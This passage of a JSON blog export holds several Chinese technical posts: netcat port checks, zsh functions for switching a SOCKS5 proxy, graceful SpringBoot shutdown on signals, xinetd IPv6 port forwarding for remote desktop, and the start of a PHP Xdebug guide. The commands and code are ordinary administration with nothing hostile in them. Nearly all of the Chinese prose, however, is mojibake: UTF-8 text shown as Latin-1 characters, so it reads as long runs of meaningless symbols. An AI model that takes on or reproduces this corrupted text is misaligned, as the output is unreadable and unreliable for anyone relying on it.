æ¥ä½œç¬¬ä¸€æ­¥è¯Šæ–­ï¼š å¦‚æœ telnet èƒ½è¿æ¥æˆåŠŸï¼Œåˆ™è¡¨ç¤ºæœ¬åœ°å¼€å‘ç¯å¢ƒå‡ºäº†é—®é¢˜123Trying 120.27.216.xxx...Connected to es.example.com.Escape character is &#39;^]&#39;. å¦‚æœ telnet æ— æ³•è¿æ¥ï¼Œåˆ™è¡¨ç¤ºå¯èƒ½å› ä¸ºå…¬å¸IPå˜åŒ–åæ— æ³•å‘½ä¸­é˜¿é‡Œäº‘å®‰å…¨ç»„ç™½åå•æ‰€è‡´12Trying 120.27.216.xxx...telnet: Unable to connect to remote host: Connection refused å…¶å®å¯ä»¥ä¸ç”¨ telnetï¼Œè€Œä¸” telnet åœ¨ macOS ç¯å¢ƒä¸­å¹¶æ²¡æœ‰é¢„è£…ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ç”¨ nc -vz es.example.com 9200 æ¥æ›¿ä»£ ç«¯å£èƒ½è®¿é—®1Connection to es0.example.com (120.27.216.xxx) 9200 port [tcp&#x2F;wap-wsp] succeeded! ç«¯å£æ— æ³•è®¿é—®1nc: connect to es0.example.com (120.27.216.xxx) port 9200 (tcp) failed: Connection refused å†™åœ¨æœ€åæœ¬æ–‡æ¼”ç¤ºäº†ä¸€äº› OpenBSD netcat çš„æ¡ˆä¾‹ï¼Œå…¶å®ç”¨ç®¡é“é…åˆå…¶ä»–å·¥å…·ï¼Œè¿˜èƒ½å‡ºå¾ˆå¤šå¾ˆå¤šçš„æ¡ˆä¾‹ï¼Œä½†æ˜¯å¸æ”¶äº†ä¸Šé¢çš„å‡ ä¸ªæ¡ˆä¾‹ä¹‹åï¼Œé€šè¿‡ä¸¾ä¸€åä¸‰ï¼Œç›¸ä¿¡è¯»è€…ä¹Ÿèƒ½æ·±è°™ netcat çš„å¼ºå¤§ã€‚ åé¢ç¬”è€…ä¼šä»¥ GNU netcat ä¸ºé‡ç‚¹å†™ä¸ª ç¯‡äºŒï¼Œå› å…¶å­˜åœ¨ -e å‚æ•°ï¼Œæ‰€ä»¥å…¶éƒ¨åˆ†å†…å®¹å•ç‹¬æ‹å‡ºæ¥ä¹Ÿå¯ä»¥ä½œä¸º ç«¯å£è½¬å‘(ç¯‡ä¸‰) - GNU netcat æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"}]},{"title":"å‘½ä»¤è¡Œä¸‹å¿«æ·å¼€å…³ä»£ç†","slug":"ProxySwitch-for-Command-Line","date":"2020-12-09T09:36:41.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"ProxySwitch-for-Command-Line.html","link":"","permalink":"https://blog.chaosjohn.com/ProxySwitch-for-Command-Line.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ç¬”è€…ç»å¸¸ä¼šé‡åˆ°åœ¨å‘½ä»¤è¡Œä¸‹ä¸å¾—ä¸èµ°ä»£ç†çš„æƒ…å†µï¼š Homebrew &amp; Caskï¼ˆç‰¹åˆ«æ˜¯åè€…ï¼Œä¸èµ°ä»£ç†çš„è¯é€Ÿåº¦ç®€ç›´æ„Ÿäººï¼‰ ä» Github æ‰§è¡Œå„ç§æ“ä½œï¼ˆclone / pull / push / fetchï¼‰ æ—§æ–¹æ¡ˆç¬”è€…åœ¨æœ¬åœ°çš„ 1080 ç«¯å£æ­å»ºäº† socks5 ä»£ç†å¼€å¯ä»£ç†ï¼š 1export all_proxy&#x3D;socks5:&#x2F;&#x2F;localhost:1080 &amp;&amp; export ALL_PROXY&#x3D;$all_proxy æœ‰æ—¶å€™è¦ç”¨åˆ°å±€åŸŸç½‘çš„å¦å¤–ä¸€å°ç”µè„‘ä¸Šæ­å»ºçš„ä»£ç†ï¼Œè¿˜å¾—å°† localhost æ”¹ä¸ºé‚£å°ç”µè„‘çš„IPã€‚ è™½ç„¶ zsh å¯ä»¥é€šè¿‡é”®å…¥å‰å‡ ä¸ªå­—æ¯æ¯”å¦‚ export all_ ç„¶åé€šè¿‡ æ–¹å‘ä¸Šå¥ å¿«é€Ÿå®šä½åˆ°ä¹‹é—´çš„å†å²ï¼Œç„¶åå‘å·¦ç§»åŠ¨å…‰æ ‡ï¼Œåˆ å» localhostï¼Œé‡æ–°è¾“å…¥æ–°çš„ IPï¼Œä½†æ˜¯ç¬”è€…è¿˜æ˜¯å«Œéº»çƒ¦ï¼Œæ‰€ä»¥åŠ¨äº†é€ è½®å­çš„å¿ƒæ€ã€‚ æ–°æ–¹æ¡ˆå› ä¸ºç¬”è€…é‡‡ç”¨çš„æ˜¯ zshï¼Œæ‰€ä»¥åœ¨ $HOME/.zshrc å†…æ·»åŠ ä»¥ä¸‹å‡½æ•° 1234567891011121314151617181920function socks5on() &#123; _PORT&#x3D;&quot;1080&quot; _HOST&#x3D;&quot;127.0.0.1&quot; if [ $# &#x3D; 0 ]; then elif [ $# &#x3D; 1 ]; then _PORT&#x3D;$1 elif [ $# &#x3D; 2 ]; then _HOST&#x3D;$1 _PORT&#x3D;$2 fi export all_proxy&#x3D;socks5:&#x2F;&#x2F;$&#123;_HOST&#125;:$&#123;_PORT&#125; export ALL_PROXY&#x3D;$all_proxy echo $ALL_PROXY&#125;function socks5off() &#123; unset all_proxy unset ALL_PROXY&#125; å‡½æ•° socks5on çš„ç”¨æ³•ï¼š $ socks5on è®¾ç½®ä»£ç†ä¸º socks5://127.0.0.1:1080 $ socks5on 1081 è®¾ç½®ä»£ç†ä¸º socks5://127.0.0.1:1081 $ socks5on 192.168.0.253 1080 è®¾ç½®ä»£ç†ä¸º socks5://192.168.0.253:1080 å‡½æ•° socks5off çš„ç”¨æ³•ï¼š $ socks5off å–æ¶ˆä»£ç†è®¾ç½® æ³¨æ„ï¼š socks5on å‡½æ•°é‡Œï¼Œç¬”è€…å˜é‡å–å _HOST è€Œä¸æ˜¯ HOSTï¼Œæ˜¯å› ä¸º $HOST é»˜è®¤å­˜æ”¾ç³»ç»Ÿä¸»æœºåç§°ã€‚ all_proxy å’Œ ALL_PROXY åŒæ—¶éƒ½è®¾ç½®ï¼Œæ˜¯å› ä¸ºï¼Œæœ‰çš„ç¨‹åºè¯»å– $all_proxyï¼Œæœ‰çš„ç¨‹åºè¯»å– $ALL_PROXYã€‚ è¯»è€…å¯ä»¥æ‹¿å»è‡ªè¡Œæ›´æ”¹é£Ÿç”¨å“ˆã€‚ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"zsh","slug":"zsh","permalink":"https://blog.chaosjohn.com/tags/zsh/"}]},{"title":"SpringBoot ä¼˜é›…é€€å‡º","slug":"SpringBoot-exit-gracefully","date":"2020-12-08T15:11:54.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"SpringBoot-exit-gracefully.html","link":"","permalink":"https://blog.chaosjohn.com/SpringBoot-exit-gracefully.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èƒŒæ™¯å…¬å¸æŸé¡¹ç›®çš„åç«¯æŠ€æœ¯æ ˆé‡‡ç”¨çš„æ˜¯ SpringBoot + Kotlinï¼Œå…·ä½“ç»†èŠ‚æœ¬æ–‡ä¸ä½œå±•å¼€ã€‚ ä¸šåŠ¡ä¸­ï¼Œç”¨æˆ·åœ¨æˆ‘ä»¬å¹³å°ä¸Šè´­ä¹°äº§å“ï¼Œæˆ‘ä»¬é€šè¿‡å®æ—¶è¯·æ±‚ä¾›åº”å•†çš„äº¤æ˜“APIï¼Œåœ¨å•†æˆ·ä½™é¢ï¼ˆå³æˆ‘ä»¬åœ¨ä¾›åº”å•†é‚£è¾¹çš„å‚¨å€¼ï¼‰é‡Œæ‰£é™¤å¯¹åº”çš„é‡‘é¢åï¼Œæ‰ä¼šå°†äº§å“çš„â€œæºæ–‡ä»¶â€è¿”å›ï¼Œè¿›è€Œäº¤ä»˜ç»™ç”¨æˆ·ã€‚ é¡¹ç›®è¿­ä»£ä¸­æˆ‘ä»¬éœ€è¦ä¸æ–­çš„éƒ¨ç½²æ–°çš„ç‰ˆæœ¬ä¸Šçº¿ï¼Œæœ€åˆçš„åšæ³•å¾ˆæš´åŠ›ï¼Œæ„å»ºæ–°çš„ flatjar è¿è¡Œèµ·æ¥ï¼Œç„¶åç›´æ¥ç»“æŸæ‰ æ—§çš„ java è¿›ç¨‹ã€‚ ç„¶åå°±å‘ç°é—®é¢˜äº†ï¼šæŸæ¬¡è´­ä¹°è¡Œä¸ºä¸­ï¼Œäº¤æ˜“APIçš„è¯·æ±‚å‘é€å‡ºå»äº†ï¼Œè¿˜æ²¡ç­‰å¾…è¯·æ±‚è¿”å›ï¼Œè¿›ç¨‹å°±è¢«æ€æ­»äº†ï¼Œé€ æˆå‚¨å€¼ä½™é¢è¢«æ‰£äº†ï¼Œä½†æ˜¯â€œæºæ–‡ä»¶â€å¹¶æ²¡æœ‰æ‹¿åˆ°ï¼Œè€Œä¾›åº”å•†çš„APIåˆå­˜åœ¨å»¶è¿Ÿï¼Œå³äº¤æ˜“APIå¤„ç†æˆåŠŸï¼Œä½†æ˜¯é€šè¿‡è®¢å•æŸ¥è¯¢APIå´æŸ¥ä¸åˆ°ã€‚ æ‰€ä»¥ï¼Œå¦‚ä½•æ‰èƒ½åœ¨ java è¿›ç¨‹è¢«æ€æ­»çš„æ—¶å€™ï¼Œåšå®Œ å–„åå·¥ä½œ å†é€€å‡ºå‘¢ï¼Ÿ è§£å†³ä¸€èˆ¬æˆ‘ä»¬æ€æ­»è¿›ç¨‹ï¼Œéƒ½æ˜¯ç»™è¿›ç¨‹å‘é€ä¿¡å· Signalï¼š SIGINT SIGTERM è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°ä¸¤ä¸ªç±»ï¼š sun.misc.Signalï¼Œä»£è¡¨ä¿¡å· sun.misc.SignalHandlerï¼Œç”¨æ¥å¤„ç†è¿›ç¨‹æ¥æ”¶åˆ°çš„ä¿¡å· åŒæ—¶ï¼Œæˆ‘ä»¬è®¾è®¡ä»¥ä¸‹å…¨å±€å˜é‡ï¼š var killSignalReceived = false // ç”¨æ¥è¡¨ç¤ºæ˜¯å¦æ¥æ”¶åˆ°ç»ˆæ­¢ä¿¡å· val jobSet = mutableSetOf&lt;String&gt;() // è¡¨ç¤ºéœ€è¦åœ¨ç»“æŸä¹‹å‰ç­‰å¾…å®Œæˆçš„ä»»åŠ¡ æ‰€ä»¥äº¤æ˜“APIçš„è¯·æ±‚å¤„ç†ï¼Œæˆ‘ä»¬å°†æ”¹æˆï¼š 123456789if (!killSignalReceived) &#123; &#x2F;&#x2F; åªæœ‰ä¸º &#96;false&#96;ï¼Œæ‰è¿›è¡Œäº¤æ˜“å¤„ç† synchronized(jobSet) &#123; jobSet.add(jobTitle) &#x2F;&#x2F; å¤„ç†ä¹‹å‰ï¼Œå°†å½“å‰å¤„ç†ä»»åŠ¡å­˜å…¥ &#96;jobSet&#96; &#125; &#x2F;&#x2F; Todo: å…·ä½“å®ç°è¯·æ±‚äº¤æ˜“APIçš„å¤„ç† synchronized(jobSet) &#123; jobSet.remove(jobTitle) &#x2F;&#x2F; å¤„ç†ç»“æŸï¼Œå°†å½“å‰å¤„ç†ä»»åŠ¡ä» &#96;jobSet&#96; ä¸­ç§»é™¤ &#125;&#125; åœ¨ç¨‹åºä¸»å‡½æ•°ä¸­ï¼Œæ–°å¢ï¼š 1234567891011val killHandler &#x3D; SignalHandler &#123; logger.error(&quot;intercept signal of $&#123;it.toJson()&#125;&quot;) killSignalReceived &#x3D; true while (jobSet.isNotEmpty()) &#123; logger.error(&quot;Background Jobs: \\n\\t\\t&quot; + jobSet.joinToString(&quot;\\n\\t\\t&quot;) + &quot;\\n&quot;) Thread.sleep(1000) &#125; exitProcess(0)&#125;Signal.handle(Signal(&quot;INT&quot;), killHandler)Signal.handle(Signal(&quot;TERM&quot;), killHandler) å½“ java è¿›ç¨‹æ¥æ”¶åˆ° SIGINT å’Œ SIGTERM ä¿¡å·åï¼š å°† killSignalReceived ç½®ä¸º true å¾ªç¯æ£€æŸ¥ jobSet æ˜¯å¦ä¸ºç©º ä¸ä¸ºç©ºï¼Œæ‰“å°å½“å‰æœªç»“æŸçš„ä»»åŠ¡åˆ—è¡¨ï¼Œç­‰å¾…1såå†æ¬¡æ£€æŸ¥ ä¸ºç©ºï¼Œç¨‹åºé€€å‡º å¦‚æœéœ€è¦å¿½ç•¥ å–„åå·¥ä½œ å¼ºè¡Œé€€å‡ºï¼Œç»™è¿›ç¨‹å‘é€ SIGKILL å³å¯ï¼š kill -KILL pid kill -9 pid æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://blog.chaosjohn.com/tags/jvm/"},{"name":"java","slug":"java","permalink":"https://blog.chaosjohn.com/tags/java/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://blog.chaosjohn.com/tags/SpringBoot/"},{"name":"kotlin","slug":"kotlin","permalink":"https://blog.chaosjohn.com/tags/kotlin/"}]},{"title":"ç«¯å£è½¬å‘(ç¯‡äºŒ) - xinetd","slug":"Port-Forwarding-2","date":"2020-12-07T07:50:23.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Port-Forwarding-2.html","link":"","permalink":"https://blog.chaosjohn.com/Port-Forwarding-2.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ è¿™æ˜¯ ç«¯å£è½¬å‘ ç³»åˆ—æ–‡ç« çš„ç¬¬äºŒç¯‡ï¼Œå†å²æ–‡ç« ï¼š ç«¯å£è½¬å‘(ç¯‡ä¸€) - rinetd å‰è¨€ç¬”è€…ä¹‹å‰ä¹Ÿè¿‡ä¸€ç¯‡æ–‡ - IPv6åœ¨è™šæ‹Ÿæœºé€šè¿‡æ— çº¿ç½‘å¡æ¡¥æ¥çš„ç½‘ç»œä¸‹æ— æ³•ä½¿ç”¨(VMware WorkStation) æ–‡ä¸­èƒŒæ™¯ï¼šç¬”è€…ä¹°äº†ä¸€å° GK41ï¼Œè¿è¡Œçš„æ˜¯éšæœºå®‰è£…çš„ Windows 10ï¼ŒåŒæ—¶å€ŸåŠ© VMware Workstation è¿è¡Œäº†ä¸€å°è™šæ‹Ÿå®¢æˆ·æœº Manjaro Linuxã€‚GK41 é€šè¿‡ RJ45 ç½‘å£æ¥å…¥ç½‘ç»œï¼Œè™šæ‹Ÿæœºé‡‡ç”¨ æ¡¥æ¥ è¯¥ç½‘å£çš„æœ‰çº¿ç½‘å¡ï¼Œç»™å®¢æˆ·æœº Manjaro Linux æä¾›ç½‘ç»œæ¥å…¥ã€‚è‡³æ­¤ï¼Œä¸»æœºå’Œå®¢æˆ·æœºéƒ½å¤„äºåŒä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œä¸”éƒ½èƒ½åˆ†é…åˆ°IPv4/IPv6ï¼Œæ­¤æ—¶ GK41ï¼š192.168.0.41 Manjaro Linuxï¼š192.168.0.65 è¯‰æ±‚å› ä¸ºç¬”è€…ä¸ç»™ GK41 æ¥æ˜¾ç¤ºå™¨ï¼Œä½†åˆæƒ³é€šè¿‡ IPv6 è¿œç¨‹è®¿é—® Windows 10 çš„æ¡Œé¢ï¼Œç»“åˆç¬”è€…ä¹‹å‰é€ è¿‡ crontab + ddns6 çš„è½®å­ï¼Œæ‰€ä»¥æ‰“ç®—ï¼š Manjaro Linux é…ç½®ä¸ºå¼€æœºè‡ªå¯ Manjaro Linux ä¸Šé…ç½® ddns6ï¼Œé€šè¿‡ cron å®šæ—¶æ£€æµ‹å¹¶æ›´æ–°è‡ªèº«çš„ IPv6åœ°å€ åˆ°åŸŸå manjaro-gk41.example.com Manjaro Linux è½¬å‘è‡ªå·±çš„ 3389 ç«¯å£åˆ° Windows 10 çš„ 3389 ç«¯å£ 3389 ç«¯å£æ˜¯ RDP(Remote Desktop Protocal)ï¼ˆå¾®è½¯è¿œç¨‹æ¡Œé¢åè®®ï¼‰ çš„é»˜è®¤ç«¯å£ å‘ç°é—®é¢˜æœ€ç›´æ¥çš„æƒ³åˆ°äº† ç¯‡ä¸€ ä¸­çš„å·¥å…· - rinetd ç„¶åå°±æ˜¯ ä¸€é¡¿æ“ä½œçŒ›å¦‚è™ï¼Œè¯•å®Œå‘ç°ä¸é è°± å› ä¸º rinetd ä¸æ”¯æŒ IPv6ï¼Œå®ƒåªç›‘å¬ IPv4åœ°å€ å’Œè½¬å‘åˆ° IPv4åœ°å€ï¼Œè¯¦è§ rinetd åœ¨å…¶ Github ä¸Šçš„æŸ Issue - does the program support ipv6?ã€‚ è€çˆ·å­å›å¤é“ï¼šå¯èƒ½ä¸ä¼šæ”¯æŒ IPv6 äº†ï¼Œå› ä¸ºè¿™ç©æ„è‡ªä»ä¸Šä¸–çºªä¹åå¹´ä»£å¼€å§‹ï¼Œæˆ‘å°±æ²¡æ€ä¹ˆåŠ¨è¿‡äº†ï¼Œæ·»åŠ  IPv6 æ”¯æŒä¼°è®¡ä¼šå¾ˆéš¾ã€‚ è§£å†³é—®é¢˜åœ¨å¯»æ‰¾ rinetd æ›¿ä»£å“çš„è¿‡ç¨‹ä¸­ï¼Œç¬”è€…å‘ç°äº† xinetd xinetd å’Œ rinetd éƒ½æ˜¯ inetd(&quot;the Internet daemon&quot;) çš„æ›¿ä»£å“ã€‚ä¸è¿‡ inetd æœ€æ—©è·Ÿéš 4.3BSDï¼ˆ1986å¹´ï¼‰æ¨å‡ºï¼Œåœ¨å¦‚ä»Šçš„ ä¸»æµ Linux å‘è¡Œç‰ˆ ä¸­éƒ½å·²ç»è¢«å¼ƒç”¨äº†ï¼›è€Œ rinetd è™½ç„¶åœ¨å„å¤§åŒ…ç®¡ç†å™¨ä¸­å‡èƒ½æ‰¾åˆ°ï¼Œä½†å®ƒçš„ä½œè€…ä¹Ÿè¯´äº†ï¼Œè‡ªä»ä¸Šä¸ªä¸–çºªä¹åå¹´ä»£ä¹‹åå°±æ²¡æ€ä¹ˆåŠ¨è¿‡äº†ï¼›å¯¹äº xinetdï¼Œè™½ç„¶æœ€åä¸€ä¸ªç‰ˆæœ¬ 2.3.15 å‘å¸ƒäº 2012å¹´5æœˆ9æ—¥ï¼Œä½†Githubä¸»é¡µä¸Šæœ€è¿‘ä¸€æ¬¡æ›´æ–°è¿˜åœ¨2016å¹´ã€‚ xinetd åœ¨ 2.1.8.8pre* ç‰ˆæœ¬ï¼ˆæ—©äº2000å¹´6æœˆ4å·ï¼‰ï¼Œå°±å¢åŠ äº† IPv6 æ”¯æŒï¼Œå¤ªè¶…å‰å¤ªç‰›é€¼äº†ï¼Œè¯¦è§äº’è”ç½‘æ¡£æ¡ˆé¦† 2000-08-16 å¿«ç…§ å’Œ äº’è”ç½‘æ¡£æ¡ˆé¦† 2013-06-07 å¿«ç…§ï¼ˆå› å®˜ç½‘ http://www.xinetd.org æ—©å·²ä¸å¯è®¿é—®ï¼Œæ‰€ä»¥åªèƒ½åœ¨ äº’è”ç½‘æ¡£æ¡ˆé¦† é‡Œæ‰¾åˆ° 2000-08-16 ~ 2013-06-09 ä¹‹é—´çš„ç½‘é¡µå¿«ç…§ï¼‰ å®‰è£… Manjaro Linux / Arch Linux 1$ sudo pacman -S xinetd Debian / Ubuntu12$ sudo apt update$ sudo apt install xinetd RHEL / CentOS12$ sudo yum update$ sudo yum install xinetd FreeBSD12$ sudo pkg update$ sudo pkg install xinetd é…ç½®é…ç½®æ–‡ä»¶é»˜è®¤ä½äº /etc/xinetd.d ç›®å½•ä¸‹ï¼Œä¸”å®‰è£…å®Œä¼šé»˜è®¤åˆ›å»ºä¸€äº›å¸¸ç”¨çš„é…ç½®ï¼ˆé»˜è®¤å‡ä¸ºç¦ç”¨çŠ¶æ€ï¼šdisable = yesï¼‰ 12345678910$ ls -lh &#x2F;etc&#x2F;xinetd.d-rw-r--r-- 1 root root 306 Nov 14 2019 rlogin-rw-r--r-- 1 root root 303 Nov 14 2019 rsh-rw-r--r-- 1 root root 315 Aug 8 03:49 rsync-rw-r--r-- 1 root root 205 Sep 5 17:34 sane-rw-r--r-- 1 root root 253 Nov 13 2019 servers-rw-r--r-- 1 root root 254 Nov 13 2019 services-rw-r--r-- 1 root root 157 Nov 14 2019 talk-rw-r--r-- 1 root root 160 Nov 14 2019 telnet-rw-r--r-- 1 root root 158 Sep 6 23:32 tftp é’ˆå¯¹æˆ‘çš„è¯‰æ±‚ï¼Œåˆ›å»ºé…ç½®æ–‡ä»¶ 1234567891011121314# cat &gt;&gt; &#x2F;etc&#x2F;xinetd.d&#x2F;win10-gk41 &lt;&lt;EOFservice services&#123; flags &#x3D; IPv6 disable &#x3D; no type &#x3D; UNLISTED socket_type &#x3D; stream protocol &#x3D; tcp user &#x3D; nobody wait &#x3D; no redirect &#x3D; 192.168.0.41 3389 port &#x3D; 3389&#125;EOF è¯¥é…ç½®è¡¨ç¤ºï¼Œç›‘å¬æœ¬åœ°ç½‘å¡ IPv6åœ°å€ çš„ 3389 ç«¯å£ï¼Œç„¶åè½¬å‘åˆ° 192.168.0.41:3389 ç„¶åé‡å¯ xinetd ç”Ÿæ•ˆï¼Œåœ¨ å¾®è½¯è¿œç¨‹æ¡Œé¢ é‡Œé€šè¿‡è®¿é—® manjaro-gk41.example.com å³å¯è®¿é—®åˆ° gk41 ä¸Šè¿è¡Œçš„ Windows 10ã€‚ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"}]},{"title":"php è°ƒè¯•æŒ‡å—ï¼ˆXdebugç‰ˆï¼‰ï¼ˆç»­ï¼‰","slug":"Debug-php-continued","date":"2020-12-05T08:04:14.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Debug-php-continued.html","link":"","permalink":"https://blog.chaosjohn.com/Debug-php-continued.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€åœ¨å‰æ–‡ php è°ƒè¯•æŒ‡å—ï¼ˆXdebugç‰ˆï¼‰ å¼€å¤´ï¼Œç¬”è€…å¹äº†ä¸€å¥ â€åƒé€æœ¬æ–‡ï¼Œæ²¡æœ‰äººå°†æ¯”ä½ æ›´æ‡‚ Php Xdebug è°ƒè¯•â€œã€‚æ²¡æƒ³åˆ°æ‰“è„¸æ¥çš„å¦‚æ­¤ä¹‹å¿«ï¼Œè¿™æ‰è¿‡äº†ä¸‰å››å¤©ï¼Œæˆ‘å‘ç°ä»Šå¤©çš„æˆ‘æ¯”å†™å‰æ–‡æ—¶çš„æˆ‘ï¼Œæ›´æ‡‚ äº†ã€‚ å…³äº PhpStorm 2020.3 å’Œ Xdebug 3åœ¨å‰æ–‡ä¸­ï¼Œç¬”è€…ç”¨çš„è¿˜æ˜¯ PhpStorm 2020.2.4ï¼Œæ‰€ä»¥ç»“åˆ Xdebug 3.0.0 åœ¨ä½¿ç”¨ Web Server Debug Validation è¿›è¡Œ è°ƒè¯•ç¯å¢ƒéªŒè¯ æ—¶ï¼Œæç¤ºç±»ä¼¼ Xdebug port is invalid çš„æŠ¥é”™ï¼Œåˆ†ææ˜¯ ä¸å…¼å®¹ 3.0.0 ç‰ˆæœ¬ å¯¼è‡´çš„ã€‚æ‰€ä»¥é™çº§æˆäº† Xdebug 2.9.8 æ‰é¡ºåˆ©å†™å®Œäº†æ–‡ç« ã€‚ å†™å®Œå‰æ–‡çš„ç¬¬äºŒå¤©ï¼ŒPhpStorm 2020.3å°±å‘å¸ƒäº†ï¼Œæ–°å¢ å¯¹ PHP 8 çš„æ”¯æŒ å¯¹ Xdebug 3 çš„æ”¯æŒ åœ¨é‡æ–°ç”¨ PHPBrew å®‰è£… PHP 8 + Xdebug 3.0.0 ç¯å¢ƒå¹¶ä¸”ç”¨ Nginx + php-fpm éƒ¨ç½²èµ·æ¥åï¼ŒWeb Server Debug Validation æˆåŠŸéªŒè¯ã€‚ å…³äº Web Server Debug Validation åŠŸèƒ½ç¬”è€…åœ¨å‰æ–‡å†™å®Œåï¼Œåœ¨å‡çº§ PhpStorm 2020.3 ä¹‹å‰ï¼Œç¬”è€…é‡æ–°å®‰è£…äº† PHP 7.4.13 + Xdebug 3.0.0 ç¯å¢ƒï¼Œåœ¨å¿½ç•¥ éªŒè¯æŠ¥é”™ çš„æƒ…å†µä¸‹ç›´æ¥å¼€å¯è°ƒè¯•ï¼Œæ˜¯å®Œå…¨æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ã€‚æ‰€ä»¥ï¼Œè¯¥åŠŸèƒ½åªæ˜¯ éªŒè¯è°ƒè¯•ç¯å¢ƒï¼Œåœ¨è°ƒè¯•ä¹‹å‰ä»…ä½œå‚è€ƒï¼Œä¸å½±å“å®é™…è°ƒè¯•ã€‚ å…³äº è¿œç¨‹è°ƒè¯•ç¬”è€…åœ¨å†™å‰æ–‡å…³äº è¿œç¨‹è°ƒè¯• çš„å‡ èŠ‚æ—¶ï¼Œå‚è€ƒäº†ç½‘ä¸Šå¾ˆå¤šæ–‡ç« ï¼Œçœ‹ä¼¼åƒé€äº†ï¼Œå…¶å®ä¸ç„¶ï¼ŒåŸå› æœ‰è¿™æ ·å‡ ç‚¹ï¼š ç½‘ä¸Šå¾ˆå¤šæ–‡ç« çš„ä½œè€…å†™æ–‡æ—¶ä¹Ÿå¦‚åŒç¬”è€…å†™å‰æ–‡æ—¶ä¸€æ ·ï¼Œå¯¹åŸç†ä¸€çŸ¥åŠè§£ï¼Œå¯¼è‡´å¾ˆå¤šè®²è§£å…¶å®ä¸å®Œå–„æˆ–è€…å—è¾•åŒ—è¾™ã€‚æ­£ç¡®çš„åšæ³•ï¼šç ”è¯» JetBrains / VSCode / Xdebug çš„å®˜æ–¹æ–‡æ¡£ï¼Œå»ç†è§£å®ƒçš„åŸç†ã€‚ Configure Xdebugâ€”PhpStorm PhpStormå®˜æ–¹ï¼šé…ç½® Xdebug Remote debugging via SSH tunnelâ€”PhpStorm PhpStormå®˜æ–¹ï¼šé€šè¿‡SSHéš§é“è¿›è¡Œè¿œç¨‹è°ƒè¯• Multiuser debugging via Xdebug proxiesâ€”PhpStorm PhpStormå®˜æ–¹ï¼šé€šè¿‡ Xdebug ä»£ç†è¿›è¡Œå¤šäººè°ƒè¯• PHP Debug Adapter for Visual Studio Code VSCode PHP Debug æ’ä»¶ä¸»é¡µæ–‡æ¡£ Step Debugging Xdeubgå®˜æ–¹ï¼šå•æ­¥è°ƒè¯• Documentation - all settings Xdebugå®˜æ–¹ï¼šæ‰€æœ‰é…ç½®é¡¹ Upgrading from Xdebug 2 to 3 Xdebugå®˜æ–¹ï¼šä»Xdebug 2 å‡çº§åˆ° Xdebug 3 ç¬”è€…å†™å‰æ–‡æ—¶æ­å»ºçš„ è¿œç¨‹è°ƒè¯•ç¯å¢ƒ ä¸å®Œå–„ æœ¬æœº å’Œ è¿œç¨‹æœåŠ¡å™¨ éƒ½æ˜¯ macOS æœ¬æœº å’Œ è¿œç¨‹æœåŠ¡å™¨ éƒ½åœ¨ å±€åŸŸç½‘å†… IDE ç»“åˆ Xdebug è°ƒè¯•çš„åŸç† IDEï¼ˆæœ¬èº«æˆ–åˆ©ç”¨æ’ä»¶ï¼‰ æ‰“å¼€æœ¬åœ°çš„ 9000 ç«¯å£å¹¶è¿›è¡Œç›‘å¬ï¼ˆXdebug 2.X é»˜è®¤ä¸º 9000ï¼ŒXdebug 3.X é»˜è®¤ä¸º 9003ï¼Œä½†å‡å¯ä¿®æ”¹ï¼‰ IDEï¼ˆæœ¬èº«æˆ–åˆ©ç”¨æ’ä»¶ï¼‰ åšå¥½è·¯å¾„æ˜ å°„ï¼ˆpath 